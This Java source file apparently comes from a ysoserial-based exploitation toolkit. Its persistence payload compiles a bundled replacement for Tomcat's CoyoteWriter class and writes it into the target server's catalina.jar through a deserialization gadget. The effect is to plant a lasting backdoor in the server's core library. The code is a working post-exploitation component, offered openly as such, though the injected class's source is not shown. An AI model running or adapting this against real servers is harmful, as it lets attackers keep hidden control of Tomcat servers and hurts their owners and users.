package ysoserial.payloads.persist;

import ysoserial.payloads.Eval;
import ysoserial.payloads.util.JavaCompiler;
import ysoserial.payloads.util.ReadWrite;

public class CoyoteWriter_write {
    public static void main(final String[] args) throws Exception {

    }

    public Object getObject(Class gadget,String tomcatHome) throws Exception {
        if(tomcatHome.lastIndexOf("/") == tomcatHome.length() - 1){
            tomcatHome = tomcatHome.substring(0,tomcatHome.length() -1 );
        }
        String className = "org.apache.catalina.connector.CoyoteWriter";
        String entryPath = className.replace(".","/") + ".class";
        String jarPath = tomcatHome + "/lib/catalina.jar";

        String java = new String(ReadWrite.readResource(CoyoteWriter_write.class,"persist/CoyoteWriter.java"));

        byte[] b = JavaCompiler.compile("CoyoteWriter",java);

        return new Eval().updateJar(gadget,jarPath,entryPath,b);
    }
}
